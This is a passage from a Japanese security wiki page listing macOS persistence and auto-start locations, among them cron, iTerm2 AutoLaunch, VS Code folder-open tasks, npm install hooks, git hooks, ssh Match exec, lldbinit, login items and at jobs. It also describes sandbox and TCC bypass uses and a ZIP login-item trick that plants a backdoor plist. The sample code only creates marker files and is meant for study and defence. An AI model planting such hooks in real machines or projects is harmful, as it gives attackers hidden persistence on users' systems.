使い捨てアカウントでは、`crontab`でマーカーのみのユーザーcronエントリを登録し、確認後に削除できます。`crontab <file>`を実行すると、アカウントの既存のcrontab全体が**置き換えられる**ため、使い捨てアカウントでない場合は、事前に保存して復元してください:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- sandbox bypassに有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2には以前、TCC permissionsが付与されていた

#### Locations

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Trigger**: このフォルダ内にある対象のPython API scriptを使ってiTerm2を起動する
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Trigger**: iTerm2を起動する。AppleScriptのstartup hookについては別途説明されている
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Trigger**: commandまたはinitial textでpayloadを呼び出すprofileを使ってsessionを作成する

#### Description & Exploitation

[現在のiTerm2 Python APIガイド](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts)では、`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`内のauto-run **Python** scriptsについて説明されています。このフォルダ内の任意の実行可能な`.sh` fileが実行されるとは説明されていません。使い捨てのaccountで、次の内容を`~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`として保存してください:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

[現行の iTerm2 AppleScript ガイド](https://iterm2.com/documentation-scripting.html)では、`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`について個別に説明しており、新しいフォルダーが存在しない場合は、旧形式の`~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt`が代わりに使用されます。マーカーのみの AppleScript は次のとおりです。

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

これらのスクリプト例は、アクティブなデスクトップセッションでは実行せず、iTerm2のドキュメントと照合しました。使い捨てアカウントでテストした後、テストスクリプトと、該当する場合は`/tmp/ht-iterm-autolaunch-marker`または`/tmp/iterm2-autolaunchscpt`を削除してください。

**`~/Library/Preferences/com.googlecode.iterm2.plist`**にあるiTerm2の設定では、profile commandまたはinitial textを指定できます。後者はセッションに入力されますが、実行されるかどうかは、それを解釈するshellに依存します。[iTerm2のprofileに関するドキュメント](https://iterm2.com/documentation-preferences-profiles-general.html)では、そのprofileで新しいセッションが作成されたときに実行されるコマンドについて説明しています。

この設定はiTerm2の設定画面で構成できます。

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

コマンドは設定にも反映されます。

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

安全に評価するには、iTerm2の設定で選択したプロファイルを確認するか、設定ファイルのコピーを読み取ってください。稼働中のプロファイルで`Initial Text`を変更するとユーザーのセッションに影響するため、調査用Macでは設定を変更しませんでした。

### xbar

調査記事: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- sandboxの回避に有用: [✅](https://emojipedia.org/check-mark-button)
  - ただし、xbarがインストールされている必要があります
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - アクセシビリティ権限を要求します

#### 場所

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **トリガー**: xbarの実行時

#### 説明

人気のプログラム[**xbar**](https://github.com/matryer/xbar)がインストールされている場合、**`~/Library/Application\ Support/xbar/plugins/`**にシェルスクリプトを作成すると、xbarの起動時に実行されます:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**解説**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
  - ただし、Hammerspoon がインストールされている必要があります
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Accessibility の権限を要求します

#### 場所

- **`~/.hammerspoon/init.lua`**
  - **トリガー**: Hammerspoon の実行時

#### 説明

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) は、**LUA scripting language** を利用する **macOS** 向けの自動化プラットフォームです。完全な AppleScript コードの組み込みや shell scripts の実行にも対応しており、スクリプト機能を大幅に強化できます。<sup>[[13]](#references)</sup>

アプリは `~/.hammerspoon/init.lua` という単一のファイルを探し、起動するとそのスクリプトを実行します。

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- sandbox bypassに有用: [✅](https://emojipedia.org/check-mark-button)
  - ただし、BetterTouchToolがインストールされている必要があります
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Automation-ShortcutsとAccessibilityの権限を要求します

#### 場所

- 有効なBetterTouchTool presetから**すでに参照されている**スクリプトファイル、またはそのpresetの設定ファイル（`~/Library/Application Support/BetterTouchTool/` 内）。正確なスクリプトパスは、presetの設定方法によって異なります。

[BetterTouchToolのactionリファレンス](https://docs.folivora.ai/docs/actions/action-definitions/)には、shell-scriptとbackground-commandのactionが記載されています。関連するpresetが有効な間に、設定済みのキーボード、マウス、タッチ、widget、その他のイベントが発生する必要があります。[triggerガイド](https://docs.folivora.ai/docs/configuration/new-trigger/)では、この組み合わせについて説明しています。application-supportディレクトリ内の任意のファイルがtriggerになるわけではありません。外部の書き込み可能なスクリプトを読み込むよう設定済みのactionは、より限定的なwrite-to-executionの対象です。コードは、BetterTouchToolを使用するユーザーのアカウント権限で実行され、実際に付与されているmacOSの権限に従います。調査用Macでは`/Applications`にBetterTouchToolがなかったため、ローカルではpresetの変更も実行もしていません。

### Alfred

- sandbox bypassに有用: [✅](https://emojipedia.org/check-mark-button)
  - ただし、Alfredがインストールされている必要があります
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Automation、Accessibility、さらにはFull-Disk accessの権限を要求します

#### 場所

- インストール済みのAlfred workflowから**すでに参照されている**スクリプトまたはファイル、またはユーザーが設定した`Alfred.alfredpreferences`ディレクトリ内のworkflow。設定ディレクトリは同期されている場合があり、すべての環境に共通する固定パスはありません。

[Alfredのworkflowガイド](https://www.alfredapp.com/help/workflows/)では、Powerpackが必要であることと、UIを使ったインストール方法が説明されています。インストール済みworkflowのhotkey、keyword、その他の設定済みtriggerが発動する必要があります。[Alfredのhotkeyの例](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/)では、script actionを紹介しています。[Alfredの環境変数リファレンス](https://www.alfredapp.com/help/workflows/script-environment-variables/)では、選択した設定パスが`alfred_preferences`として公開されています。未登録のworkflowファイルを任意のディレクトリに置いても、インストールまたは実行されるとは限りません。コードは、サインイン中のAlfredユーザーの権限で実行され、実際に付与されているmacOSの権限に従います。調査用Macでは`/Applications`にAlfredがなかったため、この経路はドキュメントのみに基づいて評価しました。

### Raycast Script Commandsとextensionのrefresh

- **書き込み先:** Raycast Settings → Script Commandsで**すでに追加されている**ディレクトリ内の実行可能なスクリプト。Raycastは、新しく作成された任意のディレクトリをスキャンしません。[RaycastのScript Commandsガイド](https://manual.raycast.com/script-commands)では、ディレクトリの登録方法が説明されています。
- **triggerと実行ユーザー:** ユーザーがインデックス済みのcommandを実行する、設定済みのhotkeyまたはfallbackが実行する、あるいはRaycastが設定された`@raycast.refreshTime`に従って`inline`スクリプトをrefreshします。スクリプトは、サインイン中のRaycastユーザーとして、そのinterpreterを介して実行されます。[upstreamのmetadataリファレンス](https://github.com/raycast/script-commands#metadata)では、自動refreshの対象はinline commandに限られています。また、[Raycastのextension manifest](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md)では、インストール済みの`no-view`または`menu-bar` extension commandに対し、別途`interval`がサポートされています。通常のscript commandを追加しただけでは、実行はスケジュールされません。

登録済みのスクリプトディレクトリがある使い捨てアカウントでは、markerのみを扱うinlineスクリプトは次のようになります。

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

登録済みディレクトリに保存し、実行可能にして、Raycast に更新させます。その後、そのファイルと `/tmp/ht-raycast-refresh-marker` を削除します。調査用 Mac では通常の `/Applications` 名で Raycast が見つからなかったため、これはドキュメントに基づく手順であり、ローカルでは実行していません。Accessibility、Automation、ファイルへのアクセス許可は、引き続き macOS の許可プロンプトの対象です。

### Visual Studio Code の自動ワークスペースタスク

- **書き込み先:** ユーザーが開くワークスペース内の `.vscode/tasks.json`。
- **トリガー:** VS Code でそのワークスペースを開いたとき。ただし、フォルダーが信頼済みで、かつ自動タスクの実行が許可されている場合に限ります。信頼されていないワークスペースでは、自動タスクは実行されません。既定では、最初の自動実行の前にユーザーへ確認が表示されます。[VS Code task documentation](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) と [Workspace Trust documentation](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) では、両方の条件が説明されています。
- **実行 ID:** 設定されたタスクプロセスを通じて、VS Code ユーザーのアカウントで実行されます。これはアプリケーション固有の実行であり、ログイン時の永続化ではありません。

**新規の使い捨てワークスペース**に、マーカーのみを作成する次のタスクを `.vscode/tasks.json` に配置します:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

信頼済み workspace を開いて自動タスクを許可した後、`.autostart-task-ran` を確認します。クリーンアップするには、タスクエントリとマーカーを削除します。**これは Microsoft のドキュメントおよびインストール済みの VS Code 1.139.1 バンドルに照らして検証済みですが、稼働中のデスクトップセッションでは実行していません。**

### Chrome native messaging hosts

- **書き込み先:** 現在のユーザーの場合は `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json`、全ユーザーの場合は `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json`（管理者権限での書き込みが必要）。Chromium と Chrome for Testing ではディレクトリが異なります。[Chrome の現在のパス一覧](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location)を参照してください。
- **トリガー:** `nativeMessaging` 権限を持つインストール済み Chrome 拡張機能が、manifest に記載された正確な host name を使って `chrome.runtime.connectNative()` または `chrome.runtime.sendNativeMessage()` を呼び出すと、Chrome が host executable を起動します。Chrome を開くだけでは、新しい任意の native host は実行されません。呼び出し元の拡張機能がなければ、manifest を作成しても何も起きません。[Chrome の native messaging ガイド](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging)では、このハンドシェイクについて説明しています。
- **実行ユーザー:** Chrome ユーザーのアカウント。manifest では executable の絶対パスを指定し、呼び出し元の拡張機能の origin を明示的に許可する必要があります。

使い捨てのブラウザーアカウントとテスト用拡張機能で、次の 2 つのファイルを使って書き込みから実行までの流れを確認できます。manifest のファイル名は `name` と一致させ、`TEST_EXTENSION_ID` はその拡張機能の実際の ID に置き換えてください:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

この JSON を `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json` として保存します。manifest の `path` に指定するマーカー専用実行ファイルには、次の内容を含められます。

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

テスト用拡張機能がサービスワーカーまたは拡張機能ページから `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` を呼び出すと、マーカーによってホストが起動したことを確認できます。この最小限のホストは、長さプレフィックス付きの応答プロトコルを実装していないため、マーカーの書き込み後に拡張機能がメッセージングエラーを報告する場合があります。クリーンアップするには、テスト用の manifest、ホスト、マーカーを削除してください。macOS 26.5.2 では Chrome アプリと両方の manifest ディレクトリが存在していました。**アクティブな Chrome プロファイルには変更を加えておらず、動作確認もしていません。**

### Karabiner-Elements のキーイベントコマンド

- **書き込み先:** Karabiner-Elements がインストールされ、実行中のアカウントの `~/.config/karabiner/karabiner.json`。[Karabiner のファイル場所に関するガイド](https://karabiner-elements.pqrs.org/docs/json/location/)によると、アプリはこのファイルを監視し、書き込み後に再読み込みします。`assets/complex_modifications` 内の JSON ファイルはインポート可能なプリセットにすぎません。そこに書き込んだだけではルールは有効になりません。
- **トリガー:** ルールが有効になった後に設定済みのキーイベントを発生させます。[`to.shell_command` リファレンス](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/)にはコマンドの実行方法が記載されています。これはログイン時やファイル書き込みのたびにコードが実行される仕組みではありません。
- **実行 ID:** Karabiner のユーザープロセスを実行しているログインユーザー。Karabiner 自身の権限付与や TCC アクセスの有無は、アプリとバージョンによって異なります。

使い捨てのテストアカウントで、`karabiner.json` 内の選択したプロファイルの `complex_modifications.rules` 配列にこのルールオブジェクトを追加し、プロファイル内のその他の内容は維持してください。F18 を押して無害なマーカーを作成した後、このルールとマーカーを削除してください。通常の入力キーを置き換えないよう、F18 を使用します。

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements は macOS 26.5.2 のテストマシンの `/Applications` にインストールされていなかったため、これはローカルで実行した結果ではなく、ドキュメントに基づく PoC です。

### ローカルリポジトリの Git hooks

- **書き込み先:** `<repo>/.git/hooks/post-checkout` のような実行可能な hook。`core.hooksPath` がすでに設定されている場合は、設定されたディレクトリを使用します。通常の追跡対象ソースファイルとしてコミットされた hook は、clone に自動ではインストールされません。
- **トリガー:** 該当する Git 操作。たとえば `post-checkout` は `git checkout` または `git switch` の後に実行され、clone や worktree の作成後にも実行されることがあります。[Git の hook リファレンス](https://git-scm.com/docs/githooks)には、イベントと実行ビットの要件が記載されています。[`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath)を設定すると、hook の検索先ディレクトリが変更されます。
- **実行時のユーザー:** Git を実行するアカウント。hook が実行されるのは、リポジトリで有効な hooks ディレクトリへの書き込み権限がそのユーザーにあり、後で該当する Git 操作を実行した場合に限られます。

このマーカーのみの PoC は、完全に使い捨てのリポジトリを作成し、hook を1つインストールして、ブランチを切り替えます。macOS 26.5.2 で Apple Git 2.50.1 を使用して正常に実行されました。

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### プロジェクト内の npm lifecycle scripts

- **書き込み対象:** 書き込み可能なプロジェクトの `package.json` にある `scripts` マップ、またはユーザーが lifecycle script を実行する、インストール済みの依存パッケージです。これは開いたディレクトリから実行されるものではなく、開発ワークフローのフックです。
- **トリガーと実行ユーザー:** lifecycle scripts が許可されている場合、後続の `npm install` または `npm ci` は、npm を実行したユーザーとして `preinstall`、`install`、`postinstall` を実行します。通常の `npm run <name>` も、対応する `pre<name>` と `post<name>` scripts を実行します。[npm の lifecycle リファレンス](https://docs.npmjs.com/cli/v11/using-npm/scripts) にイベント一覧があります。 [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) を使うと、install lifecycle scripts を抑止できます。バージョンやポリシー設定によって許可される内容が変わることがあるため、対象の npm バージョンを確認してください。

この marker-only PoC は、使い捨ての空ディレクトリでローカルの npm を使って実行しました。依存関係のダウンロードや、ユーザーのプロジェクトへの変更は行いません。

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

これは Python interpreter の起動ファイルとは異なります。npm では該当する install または run アクションを実行する必要がありますが、Python の `site` コードは通常の interpreter 起動時に読み込まれる可能性があります。同様に、一般的な `Makefile` の target や build task の定義も、ユーザーまたは設定済みのツールがその target を実行する必要があります。これらは独立した OS の自動起動経路ではありません。

### Vim startup configuration

- **書き込み先:** Vim を起動するユーザーの `~/.vimrc`（または Vim の初期化順序で選択される別の startup file）。[Vim の起動に関するリファレンス](https://vimhelp.org/starting.txt.html)には、このファイルと `VIMINIT`/`EXINIT` による上書きについて記載されています。
- **トリガー:** この設定を読み込む、その後の通常の Vim 起動。Vim の `-u NONE` はユーザーの vimrc を読み込みません。これはエディター固有の実行であり、OS のログイントリガーではありません。
- **実行 ID:** Vim ユーザーのアカウント。

以下の分離された PoC は macOS の `/usr/bin/vim` を対象に実行しました。実際の Vim 設定や開いているドキュメントには書き込みません。

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim には独立したユーザー設定パス `$XDG_CONFIG_HOME/nvim/init.lua` または `init.vim` があり、[起動ドキュメント](https://neovim.io/doc/user/starting/)に従って、`plugin/` runtime ディレクトリ内のスクリプトも読み込みます。テスト用の macOS 26.5.2 マシンには Neovim がインストールされていなかったため、この variant はそこで実行していません。

### SSH client 設定コマンド

- **書き込み先:** `~/.ssh/config`、またはそこからすでに include されている別のファイル。これは client 側の設定ファイルであり、後述する server 側の `~/.ssh/rc` とは別のものです。
- **トリガー:** 条件に一致する `ssh` の実行。`Match exec` は client が設定を評価する際にローカルコマンドを実行します。接続せずに設定を表示する `ssh -G` の場合も同様です。`ProxyCommand` は client が条件に一致する接続をセットアップする際に実行されます。`LocalCommand` は接続の成功後にのみ実行され、`PermitLocalCommand yes` が必要です（デフォルトは `no`）。これらは実行タイミングと前提条件が異なります。ファイルに書き込んだだけでは実行されません。upstream の [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5) を参照してください。
- **実行ユーザー:** `ssh` を実行するローカルユーザー。条件に一致する host、適用される設定ファイル、および必要な接続が必要です。`ssh -F` で別の設定ファイルを選択できます。

この marker-only PoC は、macOS 26.5.2 上で Apple の SSH client を使って実行しました。`-G` を使うと、ネットワーク接続を行わず、ユーザーの実際の SSH 設定も読み込まずに `Match exec` を実行できます：

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### デバッガー初期化ファイル

- **書き込み先:** `~/.lldbinit`、または優先度の高いアプリケーション固有ファイル（`~/.lldbinit-lldb` など）。LLDB はデバッガーの起動時にいずれか1つを読み込みます。カレントディレクトリの `.lldbinit` はデフォルトでは実行されません。ユーザーが `target.load-cwd-lldbinit` を有効にするか、`--local-lldbinit` を指定する必要があります。[LLDB のマニュアル](https://lldb.llvm.org/man/lldb.html)を参照してください。
- **トリガーと実行ユーザー:** ユーザーが `--no-lldbinit` を指定せずに LLDB を起動すると、コマンドはそのユーザーとして実行されます。プロジェクトを開いただけでは、そのプロジェクトの `.lldbinit` が実行されるとは限りません。

次のマーカーのみを使用したテストは、ホームディレクトリと作業ディレクトリを隔離した環境で、macOS 26.5.2 の LLDB を対象に実行しました。

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

For **GDB**, the [upstream startup documentation](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) では、macOS 上の `$HOME/Library/Preferences/gdb/gdbinit`、続いて `~/.gdbinit` が挙げられています。カレントディレクトリの `.gdbinit` は[自動読み込みの安全なパス](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html)の制限を受け、`-nx`/`-nh` は初期化ファイルの読み込みを抑止します。テスト対象の Mac には GDB がインストールされていなかったため、このパターンはローカルで実行していません。

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- sandbox のバイパスに有用: [✅](https://emojipedia.org/check-mark-button)
  - ただし、ssh が有効化され、使用されている必要があります
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - SSH は FDA access を得るために使用される

#### 場所

- **`~/.ssh/rc`**
  - **トリガー**: ssh 経由でログイン
- **`/etc/ssh/sshrc`**
  - root 権限が必要
  - **トリガー**: ssh 経由でログイン

> [!CAUTION]
> ssh を有効にするには Full Disk Access が必要です:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### 説明と悪用

デフォルトでは、`/etc/ssh/sshd_config` に `PermitUserRC no` が設定されていない限り、ユーザーが **SSH経由でログインすると**、スクリプト **`/etc/ssh/sshrc`** と **`~/.ssh/rc`** が実行されます。<sup>[[14]](#references)</sup>

### **ログイン項目**

解説: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- sandboxのバイパスに有用: [✅](https://emojipedia.org/check-mark-button)
  - ただし、引数付きで `osascript` を実行する必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **登録済みのログイン項目ヘルパーアプリ:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app`（一般的なバンドル内の場所）。
  - **トリガー:** 登録時にヘルパーが直ちに起動する場合があります。その後は承認されていれば、ユーザーの次回以降のログイン時に起動します。
- **登録済みのバンドル内エージェント／デーモン:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` または `Contents/Library/LaunchDaemons/<name>.plist`。
  - **トリガー:** 承認済みのエージェントは登録時とその後のログイン時に起動する場合があります。承認済みのデーモンは起動時に起動します。デーモンには管理者の承認が必要です。

#### 説明

**システム設定 → 一般 → ログイン項目と機能拡張**では、ログイン項目とバックグラウンド項目を確認できます。macOS 13以降では、バンドル内のログイン項目、launch agent、launch daemonの登録に [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) が使えます。その [`register()` の動作](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29)は、種類と承認状態によって異なります。**ヘルパーをアプリバンドルに書き込むだけでは、新しいログイン項目は登録されません。** 一方、すでに登録されているヘルパーの実行ファイルが書き込み可能な場合、その実行ファイルを変更すると、新たな登録を行わなくても次回の起動に影響することがあります。まず実際のパスとコード署名のチェックを確認してください。

以下は、Mac上のバンドル内ヘルパーを探す読み取り専用の方法です。これらを登録したり起動したりすることはありません:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

バンドルされた launch plist では、[Apple の Service Management 移行ガイダンス](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos) の指定どおり、`BundleProgram` は app bundle のルートを基準に解決します（例: `Contents/MacOS/Helper`）。調査用 Mac で `/Applications` を読み取り専用で調べたところ、バンドルされた helper エントリが14件、`BundleProgram` 宣言が5件見つかりました。5つのターゲットはすべて解決でき、そのうち2つはユーザーによる書き込み可否チェックに合格しました。このチェックでは、どちらかの helper が登録済み、有効、署名検証後に実行可能、または sandbox から到達可能であることは確認できません。この Mac では `sfltool dumpbtm` に名前付きレコードが150件表示されました。これは検査用の補助手段であり、すべてのレコードが実行中であることを確認するテストではありません。

古い login items は Apple events 経由で管理することもできます。コマンドラインから一覧表示、追加、削除が可能ですが、追加するとユーザーの永続的なログイン設定が変更され、Automation の承認が必要になる場合があります:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` は実装上の詳細であり、ファイルを書き込むだけで payload をインストールできるサポート対象の場所ではありません。古い `SMLoginItemSetEnabled` API は、新しい helper では `SMAppService` に置き換えられています。このページに以前記載されていた `/var/db/com.apple.xpc.launchd/loginitems.501.plist` というパスは、macOS 26.5.2 のテストマシンには存在しませんでした。最新のログイン項目を評価する際は、想定上のデータベースパスではなく、登録 API とシステム UI の状態を確認してください。

### ZIP を Login Item にする

（Login Items に関する前のセクションの補足です）

**ZIP** ファイルを **Login Item** として保存すると、**`Archive Utility`** がそのファイルを開きます。たとえば ZIP が **`~/Library`** に保存され、バックドアを含む **`LaunchAgents/file.plist`** フォルダが入っていた場合、そのフォルダが作成され（デフォルトでは存在しません）、plist が追加されます。その結果、ユーザーが次回ログインしたときに **plist で指定された backdoor が実行されます**。

別の方法として、ユーザーの HOME 内に **`.bash_profile`** と **`.zshenv`** ファイルを作成することもできます。これなら、LaunchAgents フォルダがすでに存在する場合でも、この手法は機能します。

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- sandbox の回避に有用: [✅](https://emojipedia.org/check-mark-button)
  - **`at`** を**実行**する必要があり、有効化されていなければなりません
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`at`** を**実行**する必要があり、有効化されていなければなりません

#### **説明**

`at` タスクは、指定した時刻に実行する**一度限りのタスクをスケジュールする**ためのものです。cron ジョブとは異なり、`at` タスクは実行後に自動的に削除されます。これらのタスクはシステムの再起動後も保持されるため、特定の条件下ではセキュリティ上の懸念となり得る点に注意してください。<sup>[[16]](#references)</sup>

同梱されている `com.apple.atrun.plist` では `Disabled = true` となっていますが、launchd は有効／無効の実効的な上書き設定を別に保持します。macOS 26.5.2 のテストマシンでは、`launchctl print-disabled system` の出力で、同梱 plist の設定にかかわらず `com.apple.atrun` は**有効**と報告されました。`at` ジョブが実行されると断定する前に、実効状態を確認してください:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

管理者は `launchctl` を使って無効化された `atrun` サービスを有効にできます。以下はシステムサービスの状態を変更する過去の例であり、調査用 Mac では**実行していません**。

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

これは1時間後にファイルを作成します：

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

`atq` を使用してジョブキューを確認します:

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

上記では、スケジュールされた2つのジョブを確認できます。`at -c JOBNUMBER` を使用してジョブの詳細を表示できます。

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> AT tasks が有効になっていない場合、作成されたタスクは実行されません。

**ジョブファイル**は`/private/var/at/jobs/`にあります。

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
